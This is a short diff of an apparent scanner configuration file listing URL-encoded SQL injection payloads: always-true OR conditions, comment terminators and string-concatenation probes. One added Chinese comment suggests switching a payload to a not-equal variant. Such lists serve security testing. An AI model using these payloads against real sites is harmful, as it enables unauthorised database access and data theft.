@@ -71,6 +71,7 @@
     <dbms value="All">
         <payload value="*1"/>
         <payload value="%20--%20s"/>
+        <!--payload后面改成不等于，%20or%20%27%26%27!=%27 -->
         <payload value="%20or%20%27%26%27=%27%26"/>
         <payload value="'%20'"/>
         <payload value="'||'"/>
